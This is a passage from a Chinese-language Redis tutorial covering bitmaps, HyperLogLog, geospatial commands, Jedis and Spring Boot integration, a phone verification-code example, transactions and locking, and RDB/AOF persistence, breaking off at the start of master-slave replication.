01000000 00000000  --》1\n\n- bitcount K1 1 3 ： 统计下标1、3字节组中bit=1的个数，即01000000 00000000 00100001 --》3\n- bitcount K1 0 -2 ： 统计下标0到下标倒数第2，字节组中bit=1的个数，即01000001 01000000  00000000 --》3\n\n> 实例2\n\n2022-07-02 日访问网站的userid=1,2,5,9。\n\n```bash\nsetbit users:20220702 1 1\n\nsetbit users:20220702 2 1\n\nsetbit users:20220702 5 1\n\nsetbit users:20220702 9 1\n```\n\n2022-07-03 日访问网站的userid=0,1,4,9。\n\n```bash\nsetbit users:20220703 0 1\n\nsetbit users:20220703 1 1\n\nsetbit users:20220703 4 1\n\nsetbit users:20220703 9 1\n```\n\n计算出两天都访问过网站的用户数量\n\n```bash\n127.0.0.1:6379> bitop and users:and:20220702_03 users:20220702 users:20220703\n(integer) 2\n127.0.0.1:6379> bitcount users:and:20220702_03\n(integer) 2\n```\n\n计算出任意一天都访问过网站的用户数量（例如月活跃就是类似这种） ， 可以使用or求并集\n\n```bash\n127.0.0.1:6379> bitop or users:or:20220702_03 users:20220702 users:20220703\n(integer) 2\n127.0.0.1:6379> bitcount users:or:20220702_03\n(integer) 6\n```\n\n> Bitmaps与set对比\n\n假设网站有1亿用户， 每天独立访问的用户有5千万， 如果每天用集合类型和Bitmaps分别存储活跃用户可以得到表\n\n| 数据类型 | 每个用户id占用空间 | 需要存储的用户量 |     全部内存量     |\n| :------: | :----------------: | :--------------: | :----------------: |\n| 集合类型 |        64位        |      5千万       | 64位*5千万 = 400MB |\n| Bitmaps  |        1位         |       1亿        |  1位*1亿 = 12.5MB  |\n\n很明显， 这种情况下使用Bitmaps能节省很多的内存空间， 尤其是随着时间推移节省的内存是非常可观的\n\n| 数据类型 |  一天  | 一个月 | 一年  |\n| :------: | :----: | :----: | :---: |\n| 集合类型 | 400MB  |  12GB  | 144GB |\n| Bitmaps  | 12.5MB | 375MB  | 4.5GB |\n\n但Bitmaps并不是万金油， 假如该网站每天的独立访问用户很少， 例如只有10万（大量的僵尸用户） ， 那么两者的对比如下表所示， 很显然， 这时候使用Bitmaps就不太合适了， 因为基本上大部分位都是0。\n\n| 数据类型 | 每个userid占用空间 | 需要存储的用户量 |     全部内存量     |\n| :------: | :----------------: | :--------------: | :----------------: |\n| 集合类型 |        64位        |       10万       | 64位*10万 = 800KB  |\n| Bitmaps  |        1位         |       1亿        | 1位* 1亿  = 12.5MB |\n\n### 3.2 HyperLogLog\n\n> 简介\n\n在工作当中，我们经常会遇到与统计相关的功能需求，比如统计网站PV（PageView页面访问量）,可以使用Redis的incr、incrby轻松实现。但像UV（UniqueVisitor，独立访客）、独立IP数、搜索记录数等需要去重和计数的问题如何解决？这种求集合中不重复元素个数的问题称为**基数问题**。\n\n解决基数问题有很多种方案：\n\n- （1）数据存储在MySQL表中，使用distinct count计算不重复个数\n\n- （2）使用Redis提供的hash、set、bitmaps等数据结构来处理\n\n以上的方案结果精确，但随着数据不断增加，导致占用空间越来越大，当数据集非常大时是不切实际的。\n\n能否能够降低一定的精度来平衡存储空间？Redis推出了HyperLogLog\n\n- HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定的、并且是很小的。\n\n- 在 Redis 里面，每个 HyperLogLog 键只需要花费 12KB 内存，就可以计算接近 2<sup>64</sup> 个不同元素的基数。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。\n\n- 但是，因为 HyperLogLog 只会根据输入元素来计算基数，而不会储存输入元素本身，所以 HyperLogLog 不能像集合那样，返回输入的各个元素。\n\n什么是基数?\n\n比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, 基数(不重复元素)为5。 基数估计就是在误差可接受的范围内，快速计算基数。\n\n> HyperLogLog的常见命令\n\n- pfadd \\<key> \\<element> [element ...]  添加指定元素到 HyperLogLog 中\n\n```bash\n127.0.0.1:6379> pfadd hll \"redis\"\n(integer) 1\n127.0.0.1:6379> pfadd hll \"mysql\"\n(integer) 1\n127.0.0.1:6379> pfadd hll \"redis\"\n(integer) 0\n```\n\n- pfcount \\<key> [key ...] 计算HLL的近似基数，可以计算多个HLL，比如用HLL存储每天的UV，计算一周的UV可以使用7天的UV合并计算即可\n\n```bash\n127.0.0.1:6379> pfcount hll\n(integer) 2\n\n127.0.0.1:6379> pfadd hll2 \"mongodb\"\n(integer) 1\n127.0.0.1:6379> pfadd hll2 \"redis\"\n(integer) 1\n127.0.0.1:6379> pfcount hll hll2\n(integer) 3\n```\n\n- pfmerge \\<destkey> \\<sourcekey> [sourcekey ...] 将一个或多个HLL合并后的结果存储在另一个HLL中，比如每月活跃用户可以使用每天的活跃用户来合并计算可得\n\n```bash\n127.0.0.1:6379> pfmerge hllsum hll hll2\nOK\n127.0.0.1:6379> pfcount hllsum\n(integer) 3\n```\n\n### 3.3 Geospatial\n\n> 简介\n\nRedis 3.2 中增加了对GEO类型的支持。GEO，Geographic，地理信息的缩写。该类型就是元素的2维坐标，在地图上就是经纬度。redis基于该类型，提供了经纬度设置，查询，范围查询，距离查询，经纬度Hash等常见操作。\n\n>命令\n\n- geoadd \\<key> < longitude> \\<latitude> \\<member> [longitude latitude member...]  添加地理位置（经度，纬度，名称）\n\n```bash\ngeoadd china:city 121.47 31.23 shanghai\ngeoadd china:city 106.50 29.53 chongqing 114.05 22.52 shenzhen 116.38 39.90 beijing\n```\n\n- geopos \\<key>\\<member> [member...] 获得指定地区的坐标值\n\n```bash\n127.0.0.1:6379> geopos china:city shanghai\n1) 1) \"121.47000163793563843\"\n   2) \"31.22999903975783553\"\n```\n\n- geodist \\<key> \\<member1>\\<member2> [m|km|ft|mi] 获取两个位置之间的直线距离\n  - m 表示单位为米[默认值]\n  - km 表示单位为千米\n  - ft 表示单位为英尺\n  - mi 表示单位为英里\n\n```bash\n127.0.0.1:6379> geodist china:city shanghai beijing km\n\"1068.1535\"\n```\n\n- georadius \\<key> \\<longitude> \\<latitude> radius m|km|ft|mi  以给定的经纬度为中心，找出某一半径内的元素\n\n```bash\n127.0.0.1:6379> georadius china:city 110 30 1000 km\n1) \"chongqing\"\n2) \"shenzhen\"\n```\n\n# 四、Jedis\n\n## 1.引入依赖\n\n```xml\n<!--引入Jedis依赖-->\n<dependency>\n    <groupId>redis.clients</groupId>\n    <artifactId>jedis</artifactId>\n    <version>4.2.0</version>\n</dependency>\n\n<!--引入单元测试依赖-->\n<dependency>\n    <groupId>org.junit.jupiter</groupId>\n    <artifactId>junit-jupiter</artifactId>\n    <version>5.8.2</version>\n    <scope>test</scope>\n</dependency>\n```\n\n## 2.与Redis建立连接\n\n```java\npublic class JedisTest {\n    public static void main(String[] args) {\n        // 获取连接\n        Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n        // 如果 Redis 服务设置了密码，需要下面这行，没有就不需要\n        // jedis.auth(\"123456\"); \n        // 选择库（默认是下标为0的库）\n        jedis.select(0);\n        System.out.println(\"连接成功\");\n        //查看服务是否运行\n        System.out.println(\"服务正在运行: \"+jedis.ping());\n        jedis.close();\n    }\n}\n```\n\n## 3.测试相关数据类型\n\n> **Jedis-API:  Key**\n\n```java\njedis.set(\"k1\", \"v1\");\njedis.set(\"k2\", \"v2\");\njedis.set(\"k3\", \"v3\");\nSet<String> keys = jedis.keys(\"*\");\nSystem.out.println(keys.size());\nfor (String key : keys) {\n\tSystem.out.println(key);\n}\nSystem.out.println(jedis.exists(\"k1\"));\nSystem.out.println(jedis.ttl(\"k1\"));                \nSystem.out.println(jedis.get(\"k1\"));\n```\n\n> **Jedis-API:  String**\n\n```java\njedis.mset(\"str1\",\"v1\",\"str2\",\"v2\",\"str3\",\"v3\");\nSystem.out.println(jedis.mget(\"str1\",\"str2\",\"str3\"));\n```\n\n> **Jedis-API:  List**\n\n```java\nList<String> list = jedis.lrange(\"mylist\",0,-1);\nfor (String element : list) {\n\tSystem.out.println(element);\n}\n```\n\n>**Jedis-API:  set**\n\n```java\njedis.sadd(\"orders\", \"order01\");\njedis.sadd(\"orders\", \"order02\");\njedis.sadd(\"orders\", \"order03\");\njedis.sadd(\"orders\", \"order04\");\nSet<String> smembers = jedis.smembers(\"orders\");\nfor (String order : smembers) {\nSystem.out.println(order);\n}\njedis.srem(\"orders\", \"order02\");\n```\n\n> **Jedis-API:  hash**\n\n```java\njedis.hset(\"hash1\",\"userName\",\"lisi\");\nSystem.out.println(jedis.hget(\"hash1\",\"userName\"));\nMap<String,String> map = new HashMap<String,String>();\nmap.put(\"telphone\",\"13735679666\");\nmap.put(\"address\",\"beijing\");\nmap.put(\"email\",\"abc@163.com\");\njedis.hmset(\"hash2\",map);\nList<String> result = jedis.hmget(\"hash2\", \"telphone\",\"email\");\nfor (String element : result) {\n\tSystem.out.println(element);\n}\n```\n\n> **Jedis-API:  zset**\n\n```java\njedis.zadd(\"zset01\", 100d, \"z3\");\njedis.zadd(\"zset01\", 90d, \"l4\");\njedis.zadd(\"zset01\", 80d, \"w5\");\njedis.zadd(\"zset01\", 70d, \"z6\");\n\nList<String> zrange = jedis.zrange(\"zset01\", 0, -1);\nfor (String e : zrange) {\n  System.out.println(e);\n}\n```\n\n## 4.Jedis连接池\n\n---\n\n> **Jedis本身是线程不安全的，并且频繁的创建和销毁连接会有性能损耗，因此推荐大家使用Jedis连接池代替Jedis的直连方式**\n\n```java\npublic class JedisConnectionFactory {\n    private static final JedisPool jedisPool;\n\n    static {\n        //配置连接池\n        JedisPoolConfig jedisPoolConfig = new JedisPoolConfig();\n        jedisPoolConfig.setMaxTotal(8);\n        jedisPoolConfig.setMaxIdle(8);\n        jedisPoolConfig.setMinIdle(0);\n        jedisPoolConfig.setMaxWaitMillis(200);\n        //创建连接池对象\n        jedisPool = new JedisPool(jedisPoolConfig,\"127.0.0.1\",6379,1000,\"132537\");\n    }\n\n    public static Jedis getJedis(){\n       return jedisPool.getResource();\n    }\n}\n```\n\n## 5、实例—手机验证码\n\n> 要求：\n> 1、输入手机号，点击发送后随机生成6位数字码，2分钟有效\n> 2、输入验证码，点击验证，返回成功或失败\n> 3、每个手机号每天只能输入3次\n\n思路：\n\n1. 生成随机6位数字验证码：Random\n2. 验证码在2分钟内有效：把验证码放到redis里面，设置过期时间120秒\n3. 判断验证码是否一致：从redis获取验证码和输入的验证码进行比较\n4. 每个手机每天只能发送3次验证码：incr每次发送后+1，大于2的时候，提交不能发送\n\n**生成六位的验证码：**\n\n```java\n//1.生成6位数字验证码\npublic static String getCode() {\n    Random random = new Random();\n    String code = \"\";\n    for(int i=0;i<6;i++) {\n        int rand = random.nextInt(10);\n        code += rand;\n    }\n    return code;\n}\n```\n\n**验证码只能发送三次：**\n\n```java\n//2 每个手机每天只能发送三次，验证码放到redis中，设置过期时间120\npublic static void verifyCode(String phone) {\n    //连接redis\n    Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n\n    //拼接key\n    //手机发送次数key\n    String countKey = \"VerifyCode\"+phone+\":count\";\n    //验证码key\n    String codeKey = \"VerifyCode\"+phone+\":code\";\n\n    //每个手机每天只能发送三次\n    String count = jedis.get(countKey);\n    if(count == null) {\n        //没有发送次数，第一次发送\n        //设置发送次数是1\n        jedis.setex(countKey,24*60*60,\"1\");\n    } else if(Integer.parseInt(count)<=2) {\n        //发送次数+1\n        jedis.incr(countKey);\n    } else if(Integer.parseInt(count)>2) {\n        //发送三次，不能再发送\n        System.out.println(\"今天发送次数已经超过三次\");\n        jedis.close();\n    }\n\n    //发送验证码放到redis里面\n    String vcode = getCode();\n    jedis.setex(codeKey,120,vcode);//120秒\n    jedis.close();\n}\n\n```\n\n**判断验证码是否一致：**\n\n```java\n//3 验证码校验\npublic static void judgeCode(String phone,String code) {\n    //从redis获取验证码\n    Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n    //验证码key\n    String codeKey = \"VerifyCode\"+phone+\":code\";\n    String redisCode = jedis.get(codeKey);\n    //判断\n    if(redisCode.equals(code)) {\n        System.out.println(\"成功\");\n    }else {\n        System.out.println(\"失败\");\n    }\n    jedis.close();\n}\n```\n\n**完整功能代码展示**\n\n```java\npublic class PhoneCode {\n\n    public static void main(String[] args) {\n        //模拟验证码发送\n        verifyCode(\"13678765435\");\n\n        //模拟验证码校验\n        //judgeCode(\"13678765435\",\"217173\");\n    }\n\n\n    //3 验证码校验\n    public static void judgeCode(String phone,String code) {\n        //从redis获取验证码\n        Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n        //验证码key\n        String codeKey = \"VerifyCode\"+phone+\":code\";\n        String redisCode = jedis.get(codeKey);\n        //判断\n        if(redisCode.equals(code)) {\n            System.out.println(\"成功\");\n        }else {\n            System.out.println(\"失败\");\n        }\n        jedis.close();\n    }\n\n    //2 每个手机每天只能发送三次，验证码放到redis中，设置过期时间120\n    public static void verifyCode(String phone) {\n        //连接redis\n        Jedis jedis = new Jedis(\"127.0.0.1\",6379);\n\n        //拼接key\n        //手机发送次数key\n        String countKey = \"VerifyCode\"+phone+\":count\";\n        //验证码key\n        String codeKey = \"VerifyCode\"+phone+\":code\";\n\n        //每个手机每天只能发送三次\n        String count = jedis.get(countKey);\n        if(count == null) {\n            //没有发送次数，第一次发送\n            //设置发送次数是1\n            jedis.setex(countKey,24*60*60,\"1\");//有效期1天\n        } else if(Integer.parseInt(count)<=2) {\n            //发送次数+1\n            jedis.incr(countKey);\n        } else if(Integer.parseInt(count)>2) {\n            //发送三次，不能再发送\n            System.out.println(\"今天发送次数已经超过三次\");\n            jedis.close();\n            return;//超过三次之后就会自动退出不会再发送了，不添加这一行，即使显示发送次数，但还会有验证码还是会改变\n        }\n\n        //发送验证码放到redis里面\n        String vcode = getCode();//调用生成的验证码\n        jedis.setex(codeKey,120,vcode);//设置生成的验证码只有120秒的时间\n        jedis.close();\n    }\n\n    //1 生成6位数字验证码，code是验证码\n    public static String getCode() {\n        Random random = new Random();\n        String code = \"\";\n        for(int i=0;i<6;i++) {\n            int rand = random.nextInt(10);\n            code += rand;\n        }\n        return code;\n    }\n}\n```\n\n# 五、Redis与Spring Boot整合\n\n## 1、引入redis相关依赖\n\n```xml\n<!-- redis -->\n<dependency>\n<groupId>org.springframework.boot</groupId>\n<artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n<!--连接池依赖-->\n<dependency>\n<groupId>org.apache.commons</groupId>\n<artifactId>commons-pool2</artifactId>\n<version>2.6.0</version>\n</dependency>\n```\n\n## 2、编写配置文件\n\napplication.yml 版本\n\n```yaml\nspring:\n  redis:\n    host: 127.0.0.1 #指定redis所在的host\n    port: 6379  #指定redis的端口\n    password: 123456  #设置redis密码\n    lettuce:\n      pool:\n        max-active: 8 #最大连接数\n        max-idle: 8 #最大空闲数\n        min-idle: 0 #最小空闲数\n        max-wait: 100ms #连接等待时间\n```\n\napplication.properties 版本\n\n```properties\n#Redis服务器地址\nspring.redis.host=127.0.0.1\n#Redis服务器连接端口\nspring.redis.port=6379\n#Redis数据库索引（默认为0）\nspring.redis.database= 0\n#连接超时时间（毫秒）\nspring.redis.timeout=1800000\n#连接池最大连接数（使用负值表示没有限制）\nspring.redis.lettuce.pool.max-active=20\n#最大阻塞等待时间(负数表示没限制)\nspring.redis.lettuce.pool.max-wait=-1\n#连接池中的最大空闲连接\nspring.redis.lettuce.pool.max-idle=5\n#连接池中的最小空闲连接\nspring.redis.lettuce.pool.min-idle=0\n```\n\n## **3、编写测试类**\n\n```java\n@SpringBootTest\nclass SpringRedisApplicationTests {\n    @Resource\n    private RedisTemplate redisTemplate;\n    @Test\n    void testString() {\n        // 1.通过RedisTemplate获取操作String类型的ValueOperations对象\n        ValueOperations ops = redisTemplate.opsForValue();\n        // 2.插入一条数据\n        ops.set(\"name\",\"jianjian\");\n        // 3.获取数据\n        String name = (String) ops.get(\"name\");\n        System.out.println(\"name = \" + name);\n    }\n}\n```\n\n## \t4、RedisSerializer配置\n\n---\n\n> **RedisTemplate可以接收任意Object作为值写入Redis，只不过写入前会把Object序列化为字节形式，`默认是采用JDK序列化`，得到的结果是这样的**\n\n![](https://img.jwt1399.top/img/202207181557941.png)\n\n**缺点：**\n\n- 可读性差\n- 内存占用较大\n\n> **那么如何解决以上的问题呢？我们可以通过自定义RedisTemplate序列化的方式来解决。**\n\n**编写一个配置类`RedisConfig`**\n\n```java\n@Configuration\npublic class RedisConfig {\n\n    @Bean\n    public RedisTemplate<String,Object> redisTemplate(RedisConnectionFactory factory){\n        // 1.创建RedisTemplate对象\n        RedisTemplate<String ,Object> redisTemplate = new RedisTemplate<>();\n        // 2.设置连接工厂\n        redisTemplate.setConnectionFactory(factory);\n\n        // 3.创建序列化对象\n        StringRedisSerializer stringRedisSerializer = new StringRedisSerializer();\n        GenericJackson2JsonRedisSerializer genericJackson2JsonRedisSerializer = new GenericJackson2JsonRedisSerializer();\n\n        // 4.设置key和hashKey采用String的序列化方式\n        redisTemplate.setKeySerializer(stringRedisSerializer);\n        redisTemplate.setHashKeySerializer(stringRedisSerializer);\n\n        // 5.设置value和hashValue采用json的序列化方式\n        redisTemplate.setValueSerializer(genericJackson2JsonRedisSerializer);\n        redisTemplate.setHashValueSerializer(genericJackson2JsonRedisSerializer);\n\n        return redisTemplate;\n    }\n}\n```\n\n**此时我们已经将RedisTemplate的key设置为`String序列化`，value设置为`Json序列化`的方式，再来执行方法测试**\n\n![](https://img.jwt1399.top/img/202207181557925.png)\n\n**由于我们设置的value序列化方式是Json的，因此我们可以直接向redis中插入一个对象**\n\n```java\n@Test\nvoid testSaveUser() {\n    redisTemplate.opsForValue().set(\"user:100\", new User(\"Vz\", 21));\n    User user = (User) redisTemplate.opsForValue().get(\"user:100\");\n    System.out.println(\"User = \" + user);\n}\n```\n\n![](https://img.jwt1399.top/img/202207181609335.png)\n\n尽管Json序列化可以满足我们的需求，但是依旧存在一些问题。\n\n如上图所示，为了在反序列化时知道对象的类型，JSON序列化器会将类的class类型写入json结果中，存入Redis，会带来额外的内存开销。\n\n那么我们如何解决这个问题呢？我们可以通过下文的`StringRedisTemplate`来解决这个问题。\n\n## 5、StringRedisTemplate配置\n\n> **为了节省内存空间，我们并不会使用JSON序列化器来处理value，而是统一使用String序列化器，要求只能存储String类型的key和value。当需要存储Java对象时，手动完成对象的序列化和反序列化。**\n\n![](https://img.jwt1399.top/img/202207181939756.png)\n\n> **Spring默认提供了一个StringRedisTemplate类，它的key和value的序列化方式默认就是String方式。省去了我们自定义RedisTemplate的过程**\n\n**编写一个测试类使用StringRedisTemplate来执行以下方法**\n\n```java\n@SpringBootTest\nclass RedisStringTemplateTest {\n\n\t@Resource\n\tprivate StringRedisTemplate stringRedisTemplate;\n\n\t@Test\n\tvoid testSaveUser() throws JsonProcessingException {\n\t\t// 1.创建一个Json序列化对象\n\t\tObjectMapper objectMapper = new ObjectMapper();\n\t\t// 2.将要存入的对象通过Json序列化对象转换为字符串\n\t\tString userJson1 = objectMapper.writeValueAsString(new User(\"Vz\", 21));\n\t\t// 3.通过StringRedisTemplate将数据存入redis\n\t\tstringRedisTemplate.opsForValue().set(\"user:100\",userJson1);\n\t\t// 4.通过key取出value\n\t\tString userJson2 = stringRedisTemplate.opsForValue().get(\"user:100\");\n\t\t// 5.由于取出的值是String类型的Json字符串，因此我们需要通过Json序列化对象来转换为java对象\n\t\tUser user = objectMapper.readValue(userJson2, User.class);\n\t\t// 6.打印结果\n\t\tSystem.out.println(\"user = \" + user);\n\t}\n}\n```\n\n**执行完毕回到Redis的图形化客户端查看结果**\n\n![](/Users/jianjian/jwt1399.github.io/source/images/Redis/image-20220525172508234.png)\n\n# 六、事务 & 锁\n\n- Redis 事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。\n\n- 事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。\n\n- Redis 事务的主要作用就是串联多个命令防止别的命令插队。\n\n## 1.multi、exec、discard\n\n从输入 Multi 命令开始，输入的命令都会依次进入命令队列中，但不会执行，直到输入 Exec 后，Redis 会将之前的命令队列中的命令依次执行。组队的过程中可以通过discard来放弃组队。 \n\n![](https://img.jwt1399.top/img/202207262126943.png)\n\n```bash\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> set k1 v1\nQUEUED\n127.0.0.1:6379[1](TX)> set k2 v2\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n1) OK\n2) OK\n```\n\n## 2.错误处理\n\n组队中某个命令出现了报告错误，执行时整个的所有队列都会被取消。\n\n```bash\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> set m1 v1\nQUEUED\n127.0.0.1:6379[1](TX)> set m2\n(error) ERR wrong number of arguments for 'set' command\n127.0.0.1:6379[1](TX)> set m3 v3\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n(error) EXECABORT Transaction discarded because of previous errors.\n```\n\n如果执行阶段某个命令报出了错误，则只有报错的命令不会被执行，而其他的命令都会执行，不会回滚。\n\n```bash\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> set m1 v1\nQUEUED\n127.0.0.1:6379[1](TX)> incr m1 #错误语句\nQUEUED\n127.0.0.1:6379[1](TX)> set m2 v2\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n1) OK\n2) (error) ERR value is not an integer or out of range\n3) OK\n```\n\n## 3.事务冲突的问题\n\n想想一个场景：有很多人有你的账户,同时去参加双十一抢购\n\n一个请求想给金额减8000\n\n一个请求想给金额减5000\n\n一个请求想给金额减1000\n\n![](https://img.jwt1399.top/img/202208311123818.png)\n\n这样就会导致事务冲突，如何解决呢？\n\n### 3.1 悲观锁\n\n**悲观锁(Pessimistic Lock)**, 每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会 block 直到它拿到锁。\n\n![](https://img.jwt1399.top/img/202208311123265.png)\n\n悲观锁可以实现对于数据的串行化执行，比如syn，和lock都是悲观锁的代表，同时，悲观锁中又可以再细分为公平锁，非公平锁，可重入锁，等等\n\n### 3.2 乐观锁\n\n**乐观锁(Optimistic Lock)**，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号等机制。**乐观锁适用于多读的应用类型，这样可以提高吞吐量**。\n\n![](https://img.jwt1399.top/img/202208311124559.png)\n\n乐观锁：会有一个版本号，每次操作数据会对版本号+1，再提交回数据时，会去校验是否比之前的版本大1 ，如果大1 ，则进行操作成功，这套机制的核心逻辑在于，如果在操作过程中，版本号只比原来大1 ，那么就意味着操作过程中没有人对他进行过修改，他的操作就是安全的，如果不大1，则数据被修改过。\n\n乐观锁的典型代表：就是CAS（**Compare And Swap**），利用cas进行无锁化机制加锁，var5 是操作前读取的内存值，while中的var1+var2 是预估值，如果预估值 == 内存值，则代表中间没有被人修改过，此时就将新值去替换内存值，其中do while 是为了在操作失败时，再次进行自旋操作，即把之前的逻辑再操作一次。\n\n```java\nint var5;\ndo {\n    var5 = this.getIntVolatile(var1, var2);\n} while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));\n\nreturn var5;\n```\n\n### 3.3 watch & unwatch\n\n在执行 multi 之前，先执行 watch key1 [key2]，可以监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。\n\n```bash\n127.0.0.1:6379[1]> watch balence\nOK\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> decrby balence 10\nQUEUED\n127.0.0.1:6379[1](TX)> incrby debt 10\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n1) (integer) -10\n2) (integer) 10\n```\n\nunwatch 取消 WATCH 命令对所有 key 的监视。如果在执行 WATCH 命令之后，EXEC 命令或DISCARD 命令先被执行了的话，那么就不需要再执行 UNWATCH 了。\n\n## 4.Redis事务三特性\n\n- 单独的隔离操作\n  - 事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。 \n\n- 没有隔离级别的概念\n  - 队列中的命令没有提交之前都不会实际被执行，因为事务提交前任何指令都不会被实际执行\n\n- 不保证原子性\n  - 事务中如果有一条命令执行失败，其后的命令仍然会被执行，没有回滚 \n\n# 七、持久化\n\n## 1.RDB\n\n> RDB(Redis DataBase) 在**指定的时间间隔内**将**内存**中的数据集快照写入**磁盘**， 也就是 Snapshot 快照，它恢复时是将快照文件直接读到内存里\n\n### **RDB执行步骤**\n\n![](https://img.jwt1399.top/img/202208312223339.png)\n\n- Redis 会单独创建（fork）一个子进程来进行持久化\n  - Fork 的作用是复制一个与当前进程一样的进程。新进程的所有数据（变量、环境变量、程序计数器等） 数值都和原进程一致，但是是一个全新的进程，并作为原进程的子进程\n  - 在Linux程序中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，Linux中引入了“**写时复制技术**”\n  - **一般情况父进程和子进程会共用同一段物理内存**，只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。\n\n- 先将数据写入到一个临时文件中\n- 待持久化过程都结束了，再用这个临时文件替换上次持久化好的文件(dump.rdb)\n  - 在redis.conf中配置持久化文件名称，默认为dump.rdb\n  - rdb文件的保存路径，也可以修改。默认为Redis启动时命令行所在的目录下\n\n整个过程中，主进程是不进行任何 IO 操作的，这就确保了极高的性能，**RDB的缺点是最后一次持久化后的数据可能丢失**。\n\n### **触发RDB策略**\n\n**a>配置文件中默认的快照配置**\n\n![](https://img.jwt1399.top/img/202208312349936.png)\n\n其中 `save 3600 1`的含义是：每 3600 秒时，至少有 1 个 key 变化，则触发RDB；save 300 10和save 60 10000同理。\n\n**b>通过 `save` 或  `bgsave` 命令触发RDB策略**\n\n```sql\n127.0.0.1:6379>save\n127.0.0.1:6379>bgsave\n\n可以通过lastsave 命令获取最后一次成功执行快照的时间\n127.0.0.1:6379>lastsave\n```\n\n**save**\n\n- 优点：节约系统资源\n\n- 缺点：直接调用 rdbSave ，阻塞 Redis 主进程，直到保存完成为止。在主进程阻塞期间，服务器不能处理客户端的任何请求。\n\n**bgsave**\n\n- 优点：fork 出一个子进程，子进程负责调用 rdbSave ，并在保存完成之后向主进程发送信号，通知保存已完成。 Redis 服务器在BGSAVE 执行期间仍然可以继续处理客户端的请求\n\n- 缺点：由于会fork一个进程，因此更消耗内存\n\n### **优缺点**\n\n优点\n\n- 适合大规模的数据恢复\n\n- 对数据完整性和一致性要求不高更适合使用\n\n- 节省磁盘空间\n\n- 恢复速度快\n\n缺点\n\n- Fork的时候，内存中的数据被克隆了一份，大致2倍的膨胀性需要考虑\n\n- 虽然Redis在fork时使用了**写时拷贝技术**,但是如果数据庞大时还是比较消耗性能。\n\n- 在备份周期在一定间隔时间做一次备份，所以如果Redis意外down掉的话，就会丢失最后一次快照后的所有修改。\n\n## 2.AOF\n\n> AOF(Append Only File)：以**日志**的形式来记录每个写操作（增量保存），将Redis执行过的所有写指令记录下来(**读操作不记录**)， **只许追加文件但不可以改写文件**，redis启动之初会读取该文件重新构建数据，换言之，redis 重启的话就根据日志文件的内容将写指令从前到后执行一次以完成数据的恢复工作\n\n### AOF执行步骤\n\n![](https://img.jwt1399.top/img/202208312340365.png)\n\n- 客户端的请求写命令会被append追加到AOF缓冲区内；\n\n- AOF缓冲区根据AOF持久化策略[always,everysec,no]将操作sync同步到磁盘的AOF文件中；\n  - appendfsync always 始终同步，每次Redis的写入都会立刻记入日志；性能较差但数据完整性比较好\n  - appendfsync everysec 每秒同步，每秒记入日志一次，如果宕机，本秒的数据可能丢失。\n  - appendfsync no  不主动进行同步，把同步时机交给操作系统。\n\n- AOF文件大小超过重写策略或手动重写时，会对AOF文件rewrite重写，压缩AOF文件容量；\n- Redis服务重启时，会重新load加载AOF文件中的写操作达到数据恢复的目的；\n\n### 触发AOF策略\n\n- AOF默认不开启，需要在配置文件中设置开启\n  - 修改默认的appendonly no，改为yes\n  - 如遇到AOF文件损坏，通过 /usr/local/bin/redis-check-aof  --fix appendonly.aof 进行恢复\n\n- 可以在redis.conf中配置文件名称，默认为 appendonly.aof\n\n- AOF文件的保存路径，同RDB的路径一致。\n\n###  Rewrite压缩\n\nAOF采用文件追加方式，文件会越来越大为避免出现此种情况，新增了重写机制, 当AOF文件的大小超过所设定的阈值时，Redis就会启动AOF文件的内容压缩， 只保留可以恢复数据的最小指令集.可以使用命令bgrewriteaof\n\n### 优缺点\n\n优点\n\n- 备份机制更稳健，丢失数据概率更低。\n\n- 可读的日志文本，通过操作AOF稳健，可以处理误操作。\n\n缺点\n\n- 比起RDB占用更多的磁盘空间。\n\n- 恢复备份速度要慢。\n\n- 每次读写都同步的话，有一定的性能压力。\n\n- 存在个别Bug，造成恢复不能。\n\n## 3.总结\n\n**AOF和RDB同时开启，redis听谁的？**\n\nAOF和RDB同时开启，系统默认取AOF的数据（数据不会存在丢失）\n\n**AOF和RDB用哪个好？**\n\n官方推荐两个都启用。\n\n如果需要进行大规模数据的恢复，且对于数据恢复的完整性不是非常敏感，那 RDB 方式要比AOF方式更加的高效。不建议单独用 AOF，因为可能会出现Bug。如果只是做纯内存缓存，可以都不用。\n\n# 八、主从复制\n\n## 1.简介\n\n主机(master)数据更新后根据配置和策略， 自动同步到备/从机(slaver)的机制，Master 以写为主，Slaver 以读为主\n\n![](https://img.jwt1399.top/img/202209011443833.png)\n\n- 可实现读写分离，性能扩展\n\n- 可实现容灾快速恢复\n\n**主从复制原理**\n\n- 1、当从连接上主服务器之后，从服务器向主服务器发送数据同步消息；\n\n- 2、主服务器接到从服务器发送过来同步消息，把主服务器数据持久化为 rdb 文件，把 rdb 文件发送给从服务器，从服务器拿到 rdb 进行读取；（全量复制）\n\n  - 